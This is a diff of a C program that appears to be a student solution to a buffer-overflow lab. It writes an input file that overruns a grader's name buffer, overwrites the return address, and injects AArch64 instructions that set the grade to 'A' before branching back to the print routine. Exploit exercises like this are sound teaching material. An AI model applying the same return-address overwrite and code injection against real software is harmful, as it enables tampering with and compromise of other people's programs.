@@ -17,11 +17,11 @@ int main() {
     unsigned int MOV, STRB, ADR, B; 
     int i; 
 
+    /* return address is name[32] */
     const unsigned int returnAddress = 0x420078;
 
     /* write name and null terminator to file. 
     grader program will ... */ 
-
     psFile = fopen("dataA", "wb");
     if (psFile == NULL) {
         perror("Error opening file"); 
@@ -39,23 +39,24 @@ int main() {
 
     /* MOV X0, 'A'
     MOV grade A to register W0 using MiniAssembler */
-    MOV = MiniAssembler_mov(0, 65); /* ASCII code of A */
+    MOV = MiniAssembler_mov(0, 65); /* 65 is ASCII code of A */
     fwrite(&MOV, sizeof(unsigned int), 1, psFile);
 
     /* ADR X1, grade */
-    /* address of grade so that we can jump */
+    /* 0x420044 is address of grade variable, 
+    0x42007c holds name[36], a reference point for ADR instruction */
     ADR = MiniAssembler_adr(1, 0x420044, 0x42007c);
     fwrite(&ADR, sizeof(unsigned int), 1, psFile);
 
     /* STRB W0, X1 
     STR A in register W0 into the address pointed by X1
-    branch back to normal program flow after setting grade to A */
+    return back to normal program flow after setting grade to A */
     STRB = MiniAssembler_strb(0, 1);
     fwrite(&STRB, sizeof(unsigned int), 1, psFile);
 
     /* B back to return address */ 
-    /* 0x40087c is instruction address after getName returns
-    0xffffffffea48 is the injected instruction address based on gdb */
+    /* 0x40089c is instruction address that prints "is your grade"
+    0x420084 is name[44], a reference point for B instruction */
     B = MiniAssembler_b(0x40089c, 0x420084);
     fwrite(&B, sizeof(unsigned int), 1, psFile);
 
